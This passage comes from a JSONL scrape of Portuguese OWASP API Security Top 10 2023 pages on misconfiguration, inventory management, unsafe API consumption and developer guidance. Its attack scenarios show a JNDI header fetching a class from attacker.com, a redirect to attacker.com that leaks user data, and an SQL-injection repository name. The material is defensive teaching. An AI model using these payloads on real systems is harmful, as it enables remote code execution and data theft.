[CWE-918: Server-Side Request Forgery (SSRF)][3]\n* [URL confusion vulnerabilities in the wild: Exploring parser inconsistencies,\n   Snyk][4]\n\n[1]: https://owasp.org/www-community/attacks/Server_Side_Request_Forgery\n[2]: https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html\n[3]: https://cwe.mitre.org/data/definitions/918.html\n[4]: https://snyk.io/blog/url-confusion-vulnerabilities/\n", "timestamp": "2025-10-24T22:27:03.566517"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2023/pt-pt/0xa8-security-misconfiguration.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2023/pt-pt/0xa8-security-misconfiguration.md", "content": "# API8:2023 Security Misconfiguration\n\n| Agentes Ameaça/Vetores Ataque | Falha Segurança | Impactos |\n| - | - | - |\n| Específico da API : Abuso **Fácil** | Prevalência **Predominante** : Detectability **Fácil** | Técnico **Severo** : Específico do Negócio |\n| Os atacantes frequentemente tentam encontrar falhas não corrigidas, _endpoints_ comuns, serviços a funcionar com configurações padrão inseguras ou arquivos e diretórios não protegidos para obter acesso não autorizado ou conhecimento do sistema. A maior parte disto é conhecimento público e os _exploits_ podem estar disponíveis. | A má configuração de segurança pode ocorrer em qualquer nível da API, desde o nível da rede até o nível da aplicação. Ferramentas automatizadas estão disponíveis para detectar e explorar más configurações, como serviços desnecessários ou opções antigas. | As más configurações de segurança não expõem apenas dados sensíveis dos utilizadores, mas também detalhes do sistema que podem levar a um compromisso total do servidor. |\n\n## A API é vulnerável?\n\nA API pode ser vulnerável se:\n\n* As devidas proteções de segurança não foram aplicadas em qualquer parte da\n  API, ou se houver permissões mal configuradas em serviços de nuvem.\n* Os últimos _patches_ de segurança estão em falta ou os sistemas estão\n  desatualizados.\n* Funcionalidades desnecessárias estão ativadas (por exemplo, verbos HTTP,\n  funcionalidades de registo de eventos).\n* Existem discrepâncias na forma como os pedidos são processados pelos\n  servidores na cadeia de servidores HTTP.\n* A Segurança da Camada de Transporte (TLS) está em falta.\n* Diretivas de segurança ou de controlo de cache não são enviadas aos clientes.\n* Uma política de Partilha de Recursos entre Origens (CORS) está em falta ou mal\n  configurada.\n* As mensagens de erro incluem _stack traces_ ou expõem outras informações\n  sensíveis.\n\n## Exemplos de Cenários de Ataque\n\n### Cenário #1\n\nUm servidor de API _back-end_ mantém um registo de acesso escrito por uma \nutilidade de registo _open-source_ popular de terceiros, com suporte para \nexpansão de espaços reservados e pesquisas JNDI (Java Naming and Directory \nInterface), ambos ativados por defeito. Para cada pedido, uma nova entrada é \nescrita no ficheiro de registo com o seguinte padrão: \n`<method> <api_version>/<path> - <status_code>`.\n\nUm ator malicioso emite o seguinte pedido de API, que é escrito no ficheiro de\nregisto de acesso:\n\n```\nGET /health\nX-Api-Version: ${jndi:ldap://attacker.com/Malicious.class}\n```\n\nDevido à configuração padrão insegura da utilidade de registo e a uma política \nde rede de saída permissiva, para escrever a entrada correspondente no registo \nde acesso, ao expandir o valor no cabeçalho `X-Api-Version` do pedido, a \nutilidade de registo irá buscar e executar o objeto `Malicious.class` do \nservidor controlado remotamente pelo atacante.\n\n### Cenário #2\n\nUm site de rede social oferece uma funcionalidade de \"Mensagem Direta\" que \npermite aos utilizadores manter conversas privadas. Para recuperar novas \nmensagens de uma conversa específica, o site emite o seguinte pedido de API (a \ninteração do utilizador não é necessária):\n\n```\nGET /dm/user_updates.json?conversation_id=1234567&cursor=GRlFp7LCUAAAA\n```\n\nComo a resposta da API não inclui o cabeçalho de resposta HTTP `Cache-Control`, \nas conversas privadas acabam por ser armazenadas em cache pelo navegador, \npermitindo que agentes mal-intencionados as recuperem dos ficheiros de cache do \nnavegador no sistema de ficheiros.\n\n## Como Prevenir\n\nO ciclo de vida da API deve incluir:\n\n* Um processo de proteção reprodutível que possa ser implantado de forma fácil\n  e rápida com vista a um ambiente de execução devidamente protegido.\n* Um processo de revisão e atualização de todas as camadas da API. A revisão\n  deve incluir: ficheiros de orquestração, componentes da API e serviços na\n  nuvem (e.g., permissões dos _buckets_ S3).\n* Um processo automatizado para verificar de forma continua as configurações e\n  definições em todos os ambientes (produção, _staging_, testes,\n  desenvolvimento).\n\nE ainda:\n\n* Assegure que todas as comunicações de API, do cliente para o servidor de API e\n  qualquer componente _downstream_/_upstream_, ocorram através de um canal de\n  comunicação encriptado (TLS), independentemente de se tratar de uma API\n  interna ou pública.\n* Seja específico sobre quais verbos HTTP cada API pode utilizar: todos os\n  outros verbos HTTP devem ser desativados (por exemplo, HEAD).\n* As APIs que esperam ser acedidas a partir de clientes baseados em navegador\n  (por exemplo, aplicação web _front-end_) devem, pelo menos:\n    * implementar uma política adequada de Partilha de Recursos entre Origens\n      (CORS).\n    * incluir os Cabeçalhos de Segurança aplicáveis.\n* Restrinja os tipos de conteúdo/formatos de dados recebidos àqueles que cumprem\n  os requisitos funcionais/de negócio.\n* Assegure que todos os servidores na cadeia de servidores HTTP (por exemplo,\n  balanceadores de carga, proxies reversos e diretos, e servidores de\n  _back-end_) processem os pedidos de entrada de forma uniforme para evitar\n  problemas de dessincronização.\n* Quando aplicável, defina e faça cumprir todos os esquemas de dados de resposta\n  da API, incluindo respostas de erro, para evitar que informações de exceções e\n  outras informações valiosas sejam enviadas para os atacantes.\n\n## Referências\n\n### OWASP\n\n* [OWASP Secure Headers Project][1]\n* [Configuration and Deployment Management Testing - Web Security Testing\n  Guide][2]\n* [Testing for Error Handling - Web Security Testing Guide][3]\n* [Testing for Cross Site Request Forgery - Web Security Testing Guide][4]\n\n### Externas\n\n* [CWE-2: Environmental Security Flaws][5]\n* [CWE-16: Configuration][6]\n* [CWE-209: Generation of Error Message Containing Sensitive Information][7]\n* [CWE-319: Cleartext Transmission of Sensitive Information][8]\n* [CWE-388: Error Handling][9]\n* [CWE-444: Inconsistent Interpretation of HTTP Requests ('HTTP Request/Response\n  Smuggling')][10]\n* [CWE-942: Permissive Cross-domain Policy with Untrusted Domains][11]\n* [Guide to General Server Security][12], NIST\n* [Let's Encrypt: a free, automated, and open Certificate Authority][13]\n\n[1]: https://owasp.org/www-project-secure-headers/\n[2]: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/README\n[3]: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/08-Testing_for_Error_Handling/README\n[4]: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/05-Testing_for_Cross_Site_Request_Forgery\n[5]: https://cwe.mitre.org/data/definitions/2.html\n[6]: https://cwe.mitre.org/data/definitions/16.html\n[7]: https://cwe.mitre.org/data/definitions/209.html\n[8]: https://cwe.mitre.org/data/definitions/319.html\n[9]: https://cwe.mitre.org/data/definitions/388.html\n[10]: https://cwe.mitre.org/data/definitions/444.html\n[11]: https://cwe.mitre.org/data/definitions/942.html\n[12]: https://csrc.nist.gov/publications/detail/sp/800-123/final\n[13]: https://letsencrypt.org/\n", "timestamp": "2025-10-24T22:27:03.679222"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2023/pt-pt/0xa9-improper-inventory-management.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2023/pt-pt/0xa9-improper-inventory-management.md", "content": "# API9:2023 Improper Inventory Management\n\n| Agentes Ameaça/Vetores Ataque | Falha Segurança | Impactos |\n| - | - | - |\n| Específico da API : Abuso **Fácil** | Prevalência **Predominante** : Deteção **Moderado** | Técnico **Moderado** : Específico Negócio |\n| Os agentes ameaça geralmente obtêm acesso não autorizado através de versões antigas de APIs ou _endpoints_ que permanecem em execução sem atualizações e que utilizam requisitos de segurança mais fracos. Em alguns casos, os _exploits_ estão disponíveis online. Alternativamente, podem obter acesso a dados sensíveis através de um terceiro com quem não há razão para compartilhar dados. | Documentação desatualizada torna mais difícil encontrar e/ou corrigir vulnerabilidades. A falta de inventário de recursos e estratégias de desativação leva à execução de sistemas sem atualizações, resultando em vazamentos de dados sensíveis. É comum encontrar hosts de API desnecessariamente expostos devido a conceitos modernos como microserviços, que tornam as aplicações fáceis de implantar e independentes (por exemplo, computação em nuvem, K8S). Um simples Google Dorking, enumeração de DNS ou o uso de motores de busca especializados para vários tipos de servidores (webcams, routers, servidores, etc.) conectados à internet será suficiente para descobrir alvos. | Os atacantes podem obter acesso a dados sensíveis ou até mesmo tomar o controlo do servidor. Às vezes, diferentes versões/implementações da API estão conectadas à mesma base de dados com dados reais. Agentes ameaça podem explorar _endpoints_ obsoletos disponíveis em versões antigas da API para obter acesso a funções administrativas ou explorar vulnerabilidades conhecidas. |\n\n## A API é vulnerável?\n\nA natureza dispersa e conectada das APIs e das aplicações modernas traz novos \ndesafios. É importante que as organizações não só tenham uma boa compreensão e \nvisibilidade das suas próprias APIs e _endpoints_, mas também de como as APIs \nestão a armazenar ou a partilhar dados com terceiros.\n\nExecutar múltiplas versões de uma API requer recursos de gestão adicionais do \nfornecedor da API e expande a superfície de ataque.\n\nUma API tem um \"<ins>ponto cego de documentação</ins>\" se:\n\n* O propósito de um _host_ da API é pouco claro e não há respostas explícitas\n  para as seguintes perguntas:\n    * Em que ambiente está a API a ser executada (por exemplo, produção,\n      _staging_, teste, desenvolvimento)?\n    * Quem deve ter acesso à rede da API (por exemplo, público, interno,\n      parceiros)?\n    * Qual versão da API está em execução?\n* Não existe documentação ou a documentação existente não está atualizada.\n* Não existe um plano de desativação para cada versão da API.\n* O inventário do _host_ está em falta ou desatualizado.\n\nA visibilidade e o inventário dos fluxos de dados sensíveis desempenham um papel\nimportante como parte de um plano de resposta a incidentes, caso ocorra uma\nviolação do lado de terceiros.\n\nUma API tem um \"<ins>ponto cego de fluxo de dados</ins>\" se:\n\n* Existe um \"fluxo de dados sensíveis\" onde a API compartilha dados sensíveis\n  com um terceiro e\n    * Não existe uma justificação de negócio ou aprovação do fluxo\n    * Não existe inventário ou visibilidade do fluxo\n    * Não há visibilidade detalhada sobre o tipo de dados sensíveis partilhados\n\n\n## Exemplos de Cenários de Ataque\n\n### Cenário #1\n\nUma rede social implementou um mecanismo de limitação de frequência de pedidos \nque previne que atacantes possam usar força bruta para adivinhar _tokens_ de \nredefinição de _password_. Este mecanismo não foi implementado como parte do \ncódigo da própria API, mas num componente separado entre o cliente e a API \noficial (`api.socialnetwork.owasp.org`). Um investigador encontrou um _host_ da \nAPI beta (`beta.api.socialnetwork.owasp.org`) que executa a mesma API, incluindo\no mecanismo de redefinição de _password_, mas sem o mecanismo de limitação de \nfrequência de pedidos. O investigador conseguiu redefinir a _password_ de \nqualquer utilizador usando força bruta simples para adivinhar o _token_ de 6 \ndígitos.\n\n### Cenário #2\n\nUma rede social permite que desenvolvedores de aplicações independentes se \nintegrem com ela. Como parte desse processo, é solicitado o consentimento do \nutilizador final para que a rede social possa partilhar as informações pessoais \ndo utilizador com a aplicação independente.\n\nO fluxo de dados entre a rede social e as aplicações independentes não é \nsuficientemente restritivo ou monitorizado, permitindo que as aplicações acedam \nnão apenas às informações do utilizador, mas também às informações privadas de \ntodos os seus amigos.\n\nUma empresa de consultoria cria uma aplicação maliciosa e consegue obter o \nconsentimento de 270 mil utilizadores. Devido a essa falha, a empresa de \nconsultoria consegue aceder às informações privadas de 50 milhões de \nutilizadores. Mais tarde, a empresa de consultoria vende as informações para \nfins maliciosos.\n\n## Como Prevenir\n\n* Inventarie todos os <ins>_hosts_ da API</ins> e documentar os aspectos\n  importantes de cada um deles, focando no ambiente da API (por exemplo,\n  produção, _staging_, teste, desenvolvimento), quem deve ter acesso à rede do\n  _host_ (por exemplo, público, interno, parceiros) e a versão da API.\n* Inventarie os <ins>serviços integrados</ins> e documentar aspectos\n  importantes, como o seu papel no sistema, quais dados são trocados (fluxo de\n  dados) e a sua sensibilidade.\n* Documente todos os aspectos da sua API, como autenticação, erros,\n  redirecionamentos, limitação de frequência de pedidos, política de partilha de\n  recursos entre origens (CORS) e _endpoints_, incluindo os seus parâmetros,\n  pedidos e respostas.\n* Crie documentação automaticamente adotando padrões abertos. Inclua a\n  construção da documentação no seu _pipeline_ de CI/CD.\n* Disponibilize a documentação da API apenas para aqueles autorizados a utilizar\n  a API.\n* Utilize medidas de proteção externas, como soluções específicas de segurança\n  de API, para todas as versões expostas das suas APIs, não apenas para a versão\n  de produção atual.\naaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\n* Evite utilizar dados de produção em implementações de API que não são\n  produção. Se isso for inevitável, esses _endpoints_ devem receber o mesmo\n  tratamento de segurança que os de produção.\n* Quando versões mais recentes das APIs incluem melhorias de segurança, realize\n  uma análise de risco para informar as ações de mitigação necessárias para as\n  versões mais antigas. Por exemplo, se é possível aplicar as melhorias nessas\n  versões mais antigas sem quebrar a compatibilidade da API ou se é necessário\n  remover rapidamente a versão mais antiga e forçar todos os clientes a migrar\n  para a versão mais recente.\n\n## Referências\n\n### Externas\n\n* [CWE-1059: Incomplete Documentation][1]\n\n[1]: https://cwe.mitre.org/data/definitions/1059.html\n", "timestamp": "2025-10-24T22:27:03.783828"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2023/pt-pt/0xaa-unsafe-consumption-of-apis.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2023/pt-pt/0xaa-unsafe-consumption-of-apis.md", "content": "# API10:2023 Unsafe Consumption of APIs\n\n| Agentes Ameaça/Vetores Ataque | Falha Segurança | Impactos |\n| - | - | - |\n| Específico da API : Abuso **Fácil** | Prevalência **Comum** : Deteção **Moderado** | Técnico **Severo** : Específico Negócio |\n| Explorar este problema requer que os atacantes identifiquem e potencialmente comprometam outras APIs/serviços com os quais a API alvo está integrada. Normalmente, esta informação não está disponível publicamente ou a API/serviço integrado não é facilmente explorável. | Os desenvolvedores tendem a confiar e não a verificar os _endpoints_ que interagem com APIs externas ou de terceiros, dependendo de requisitos de segurança mais fracos, como aqueles relacionados à segurança do transporte, autenticação/autorização e validação e sanitização de dados. Os atacantes precisam identificar os serviços com os quais a API alvo se integra (fontes de dados) e, eventualmente, comprometer esses serviços. | O impacto varia de acordo com o que a API alvo faz com os dados extraídos. A exploração bem sucedida pode levar à exposição de informações sensíveis a atores não autorizados, a vários tipos de injeções ou à negação de serviço. |\n\n## A API é vulnerável?\n\nOs desenvolvedores tendem a confiar mais nos dados recebidos de APIs de \nterceiros do que nos dados fornecidos por utilizadores. Isso é especialmente \nverdade para APIs oferecidas por empresas bem conhecidas. Por essa razão, os \ndesenvolvedores tendem a adotar padrões de segurança mais fracos, especialmente \nno que diz respeito à validação e sanitização de dados.\n\nA API pode estar vulnerável se:\n\n* Interage com outras APIs através de um canal não encriptado;\n* Não valida e sanitiza corretamente os dados recolhidos de outras APIs antes de\n  os processar ou de os passar para componentes posteriores;\n* Segue redirecionamentos cegamente;\n* Não limita o número de recursos disponíveis para processar respostas de\n  serviços de terceiros;\n* Não implementa limites de tempo para interações com serviços de terceiros;\n\n## Exemplos de Cenários de Ataque\n\n### Cenário #1\n\nUma API depende de um serviço de terceiros para enriquecer os endereços \ncomerciais fornecidos pelos utilizadores. Quando um endereço é fornecido pelo \nutilizador final à API, ele é enviado para o serviço de terceiros e os dados \nretornados são então armazenados numa base de dados local compatível com SQL.\n\nAtacantes utilizam o serviço de terceiros para armazenar um conteúdo malicioso \nde injeção SQL (SQLi) associado a um negócio criado por eles. Em seguida, visam \na API vulnerável fornecendo um conteúdo específico que faz com que esta obtenha \no \"negócio malicioso\" do serviço de terceiros. O conteúdo de SQLi acaba por ser \nexecutado pela base de dados, exfiltrando dados para um servidor controlado pelo\natacante.\n\n### Cenário #2\n\nUma API integra-se com um fornecedor de serviços de terceiros para armazenar com\nsegurança informações médicas sensíveis dos utilizadores. Os dados são enviados \natravés de uma conexão segura usando um pedido HTTP como o abaixo:\n\n```\nPOST /user/store_phr_record\n{\n  \"genome\": \"ACTAGTAG__TTGADDAAIICCTT…\"\n}\n```\n\nAtacantes encontraram uma forma de comprometer a API de terceiros, que começa a \nresponder com um `308 Permanent Redirect` a pedidos como o anterior.\n\n```\nHTTP/1.1 308 Permanent Redirect\nLocation: https://attacker.com/\n```\n\nComo a API segue cegamente os redirecionamentos do terceiro, ela repetirá \nexatamente o mesmo pedido, incluindo os dados sensíveis do utilizador, mas desta\nvez para o servidor do atacante.\n\n### Cenário #3\n\nUm atacante pode preparar um repositório git chamado `'; drop db;--`.\n\nAgora, quando uma integração de uma aplicação atacada é feita com o repositório \nmalicioso, uma carga de injeção SQL é utilizada numa aplicação que constrói uma \nconsulta SQL, acreditando que o nome do repositório é um conteúdo seguro.\n\n## Como Prevenir\n\n* Ao avaliar fornecedores de serviços, analise a postura de segurança das suas\n  APIs.\n* Garanta que todas as interações com APIs ocorram através de um canal de\n  comunicação seguro (TLS).\n* Valide e sanitize sempre os dados recebidos de APIs integradas antes de os\n  utilizar.\n* Mantenha uma lista de permissões de locais conhecidos para os quais as APIs\n  integradas podem redirecionar a sua: não siga redirecionamentos cegamente.\n\n## Referências\n\n### OWASP\n\n* [Web Service Security Cheat Sheet][1]\n* [Injection Flaws][2]\n* [Input Validation Cheat Sheet][3]\n* [Injection Prevention Cheat Sheet][4]\n* [Transport Layer Protection Cheat Sheet][5]\n* [Unvalidated Redirects and Forwards Cheat Sheet][6]\n\n### Externas\n\n* [CWE-20: Improper Input Validation][7]\n* [CWE-200: Exposure of Sensitive Information to an Unauthorized Actor][8]\n* [CWE-319: Cleartext Transmission of Sensitive Information][9]\n\n[1]: https://cheatsheetseries.owasp.org/cheatsheets/Web_Service_Security_Cheat_Sheet.html\n[2]: https://www.owasp.org/index.php/Injection_Flaws\n[3]: https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html\n[4]: https://cheatsheetseries.owasp.org/cheatsheets/Injection_Prevention_Cheat_Sheet.html\n[5]: https://cheatsheetseries.owasp.org/cheatsheets/Transport_Layer_Protection_Cheat_Sheet.html\n[6]: https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html\n[7]: https://cwe.mitre.org/data/definitions/20.html\n[8]: https://cwe.mitre.org/data/definitions/200.html\n[9]: https://cwe.mitre.org/data/definitions/319.html\n", "timestamp": "2025-10-24T22:27:03.903027"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2023/pt-pt/0xb0-next-devs.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2023/pt-pt/0xb0-next-devs.md", "content": "# O Que Se Segue Para Programadores\n\nA tarefa de criar e manter aplicações seguras, ou corrigir aplicações \nexistentes, pode ser difícil. Não é diferente para as APIs.\n\nAcreditamos que educação e consciencialização são fatores chave para o\ndesenvolvimento de software seguro. Tudo o mais necessário para alcançar este\nobjetivo depende da **definição e utilização de processos de segurança\nreprodutíveis e do uso de controlos de segurança _standard_**.\n\nA OWASP disponibiliza uma grande quantidade de recursos gratuitos e abertos para\nabordar a segurança. Por favor visite a [página dos projetos OWASP][1] para \nconsulta da lista dos projetos existentes.\n\n| | |\n|-|-|\n| **Educação** | O [Application Security Wayfinder][2] deve oferecer uma boa ideia sobre quais projetos estão disponíveis para cada etapa/fase do Ciclo de Vida do Desenvolvimento de Software (SDLC). Para aprendizagem prática/treino, pode começar com [OWASP **crAPI** - **C**ompletely **R**idiculous **API**][3] ou [OWASP Juice Shop][4]: ambos possuem APIs intencionalmente vulneráveis. O [OWASP Vulnerable Web Applications Directory Project][5] fornece uma lista curada de aplicações intencionalmente vulneráveis: lá encontrará várias outras APIs vulneráveis. Também pode participar em sessões de treino da [OWASP AppSec Conference][6] ou [juntar-se ao seu chapter local][7]. |\n| **Requisitos de Segurança** | A segurança deve fazer parte de qualquer projeto desde o início. É importante que, durante a fase de identificação de requisitos, seja definido o que é que “seguro” significa no contexto desse projeto. A OWASP recomenda a utilização do [OWASP Application Security Verification Standard (ASVS)][8] como guia para definir os requisitos de segurança. Se estiver a subcontratar, considere ao invés a utilização do [OWASP Secure Software Contract Annex][9], o qual deverá adaptar às leis e regulamentações locais. |\n| **Arquitetura de Segurança** | A segurança deve ser uma preocupação durante todas as fases dum projeto. O projeto [OWASP Prevention Cheat Sheets][10] é um bom ponto inicial de orientação sobre como contemplar a segurança durante a fase de arquitetura. Entre outros, o [REST Security Cheat Sheet][11] e o [REST Assessment Cheat Sheet][12] serão seguramente relevantes, como também o [GraphQL Cheat Sheet][13]. |\n| **Controlos Standard de Segurança** | A adoção de controlos standard de segurança reduzem o risco de introdução de falhas de segurança durante a implementação da lógica de negócio. Apesar de muitas _frameworks_ modernas já incluírem controlos standard, o projeto [OWASP Proactive Controls][14] dá-lhe uma boa visão sobre que controlos de segurança deve incluir no seu projeto. A OWASP também disponibiliza algumas bibliotecas e ferramentas que pode achar úteis, tais como controlos de validação. |\n| **Ciclo de Desenvolvimento de Software Seguro** | Pode usar o [OWASP Software Assurance Maturity Model (SAMM)][15] para melhorar o processo de desenvolvimento de APIs. Tem ainda disponíveis vários outros projetos OWASP para o ajudar durante as várias fases de desenvolvimento de APIs, por exemplo o [OWASP Code Review Guide][16]. |\n\n[1]: https://owasp.org/projects/\n[2]: https://owasp.org/projects/#owasp-projects-the-sdlc-and-the-security-wayfinder\n[3]: https://owasp.org/www-project-crapi/\n[4]: https://owasp.org/www-project-juice-shop/\n[5]: https://owasp.org/www-project-vulnerable-web-applications-directory/\n[6]: https://owasp.org/events/\n[7]: https://owasp.org/chapters/\n[8]: https://owasp.org/www-project-application-security-verification-standard/\n[9]: https://owasp.org/www-community/OWASP_Secure_Software_Contract_Annex\n[10]: https://cheatsheetseries.owasp.org/\n[11]: https://cheatsheetseries.owasp.org/cheatsheets/REST_Security_Cheat_Sheet.html\n[12]: https://cheatsheetseries.owasp.org/cheatsheets/REST_Assessment_Cheat_Sheet.html\n[13]: https://cheatsheetseries.owasp.org/cheatsheets/GraphQL_Cheat_Sheet.html\n[14]: https://owasp.org/www-project-proactive-controls/\n[15]: https://owasp.org/www-project-samm/\n[16]: https://owasp.org/www-project-code-review-guide/\n", "timestamp": "2025-10-24T22:27:04.186447"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2023/pt-pt/0xb1-next-devsecops.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2023/pt-pt/0xb1-next-devsecops.md", "content": "# O Que Se Segue Para DevSecOps\n\nDada a sua importância na arquitetura das aplicações modernas, desenvolver APIs\nseguras é crucial. A segurança não pode ser negligenciada e deve estar presente\ndurante todo o clico de vida do desenvolvimento. Já não basta a execução de\n_scanners_ ou a realização de testes de penetração anualmente.\n\nA equipa de DevSecOps deve fazer parte do esforço de desenvolvimento\ncontribuindo para a realização de testes de segurança, de forma continuada,\ndurante todo o ciclo de vida do desenvolvimento. Deve ter como objetivo melhorar\na _pipeline_ de desenvolvimento com automação de segurança e sem influenciar\nnegativamente o ritmo do desenvolvimento.\n\nEm caso de dúvida mantenha-se informado e reveja o [Manifesto DevSecOps][1].\n\n| | |\n|-|-|\n| **Compreenda o Modelo de Ameaças** | As prioridades relativamente ao que deve ser testado têm origem no modelo de ameaças. Se não tem um, considere usar o [OWASP Application Security Verification Standard (ASVS)][2] e o [OWASP Testing Guide][3] como base. Envolver a equipa de desenvolvimento na elaboração do modelo de ameaças pode torná-la mais consciente para questões relacionadas com segurança. |\n| **Compreenda o Ciclo de Vida do Desenvolvimento do Software** | Reúna a equipa de desenvolvimento para melhor compreender o ciclo de vida do desenvolvimento do software. O seu contributo para a realização continua de testes de segurança deve ser compatível com as pessoas, processos e ferramentas. Todos devem concordar com o processo, de forma a não provocar atrito ou resistência desnecessários. |\n| **Estratégias de Teste** | Sendo que o seu trabalho não deve condicionar o ritmo de desenvolvimento, deverá escolher cuidadosamente a melhor (mais simples, rápida e precisa) técnica para verificar os requisitos de segurança. A [OWASP Security Knowledge Framework][4] e o [OWASP Application Security Verification Standard][2] podem ser importantes fontes de requisitos de segurança funcionais e não-funcionais. Existem outras fontes relevantes onde poderá encontrar [projetos][5] e [ferramentas][6] como aquelas disponibilizadas pela [comunidade DevSecOps][7]. |\n| **Procure Alcançar Cobertura e Precisão** | Você é a ponte entre as equipas de desenvolvimento e operações. Para alcançar cobertura, deve não só focar-se na funcionalidade, mas também na orquestração. Trabalhe junto de ambas as equipas desde o início por forma a otimizar o seu tempo e esforço. Deve almejar um estado em que o essencial da segurança é verificado de forma continua. |\n| **Comunique as Falhas de Forma Clara** | Entregue valor evitando qualquer atrito. Comunique as falhas identificadas atempadamente, usando as ferramentas que a equipa de desenvolvimento já utiliza (e não através de ficheiros PDF). Junte-se à equipa de desenvolvimento para resolver as falhas identificadas. Aproveite a oportunidade para educar os elementos da equipa de desenvolvimento, descrevendo de forma clara a falha e como esta pode ser abusada, incluindo um cenário de ataque para a tornar mais real. |\n\n[1]: https://www.devsecops.org/\n[2]: https://owasp.org/www-project-application-security-verification-standard/\n[3]: https://owasp.org/www-project-web-security-testing-guide/\n[4]: https://owasp.org/www-project-security-knowledge-framework/\n[5]: http://devsecops.github.io/\n[6]: https://github.com/devsecops/awesome-devsecops\n[7]: http://devsecops.org\n", "timestamp": "2025-10-24T22:27:04.299961"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2023/pt-pt/0xd0-about-data.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2023/pt-pt/0xd0-about-data.md", "content": "# Metodologia e Dados\n\n## Preâmbulo\n\nPara esta atualização da lista, a equipa de Segurança de API da OWASP utilizou a\nmesma metodologia adotada com sucesso para a lista de 2019, com a adição de um \n[Pedido Público por Dados][1] de 3 meses. Infelizmente, este pedido não resultou\nem dados que permitissem uma análise estatística relevante sobre os problemas de\nsegurança de API mais comuns.\n\nContudo, com uma indústria de segurança de API mais madura e capaz de fornecer \nfeedback e informações diretamente, o processo de atualização avançou usando a \nmesma metodologia de antes.\n\nChegados a este ponto, acreditamos ter um bom documento de consciencialização \npara os próximos três ou quatro anos, mais focado nas questões específicas das \nAPIs modernas. O objetivo deste projeto não é substituir outras listas de top \n10, mas sim cobrir os principais riscos de segurança de API atuais e emergentes,\nsobre os quais acreditamos que a indústria deve estar atenta e ser diligente.\n\n## Metodologia\n\nNa primeira fase, dados publicamente disponíveis sobre incidentes de segurança \nem APIs foram recolhidos, revistos e categorizados. Esses dados foram obtidos de\nplataformas de _bug bounty_ e relatórios públicos. Apenas problemas reportados \nentre 2019 e 2022 foram considerados. Esses dados ajudaram a equipa a entender \nem que direção a lista de top 10 anterior deveria evoluir, assim como a lidar \ncom possíveis vieses dos dados contribuídos.\n\nUm [Pedido Público por Dados][1] foi realizado de 1 de Setembro a 30 de Novembro\nde 2022. Em paralelo, a equipa do projeto iniciou a discussão sobre o que mudou \ndesde 2019. A discussão incluiu o impacto da primeira lista, o feedback recebido\nda comunidade e novas tendências na segurança de APIs.\n\nA equipa do projeto promoveu reuniões com especialistas sobre ameaças relevantes\nà segurança de APIs para obter informações sobre como as vítimas são impactadas \ne como essas ameaças podem ser mitigadas.\n\nEste esforço resultou num rascunho inicial do que a equipa acredita serem os dez\nriscos mais críticos de segurança para APIs. A [Metodologia de Classificação de \nRisco da OWASP][2] foi utilizada para realizar a análise de riscos. As \nclassificações de prevalência foram decididas por consenso entre os membros da \nequipa do projeto, com base na sua experiência na área. Para considerações sobre\nesses temas, consulte a secção [Riscos de Segurança em APIs][3].\n\nO rascunho inicial foi então compartilhado para revisão com profissionais de \nsegurança com experiência relevante na área de segurança de APIs. Os seus \ncomentários foram analisados, discutidos e, quando aplicável, incluídos no \ndocumento. O documento resultante foi [publicado como uma Versão Candidata][4] \npara [discussão aberta][5]. Várias [contribuições da comunidade][6] foram \nincorporadas no documento final.\n\nA lista de contribuidores está disponível na secção de [Agradecimentos][7].\n\n## Riscos Específicos de APIs\n\nA lista foi elaborada para abordar riscos de segurança que são mais específicos \npara APIs.\n\nNão implica que outros riscos genéricos de segurança de aplicações não existam \nem aplicações baseadas em APIs. Por exemplo, não incluímos riscos como \n\"Componentes Vulneráveis e Desatualizados\" ou \"Injeção\", embora você possa \nencontrá-los em aplicações baseadas em APIs. Esses riscos são genéricos, não se \ncomportam de forma diferente em APIs, nem a sua exploração é diferente.\n\nO nosso objetivo é aumentar a conscientização sobre os riscos de segurança que \nmerecem atenção especial em APIs.\n\n[1]: https://owasp.org/www-project-api-security/announcements/cfd/2022/\n[2]: https://www.owasp.org/index.php/OWASP_Risk_Rating_Methodology\n[3]: ./0x10-api-security-risks.md\n[4]: https://owasp.org/www-project-api-security/announcements/2023/02/api-top10-2023rc\n[5]: https://github.com/OWASP/API-Security/issues?q=is%3Aissue+label%3A2023RC\n[6]: https://github.com/OWASP/API-Security/pulls?q=is%3Apr+label%3A2023RC\n[7]: ./0xd1-acknowledgments.md\n", "timestamp": "2025-10-24T22:27:04.406472"}
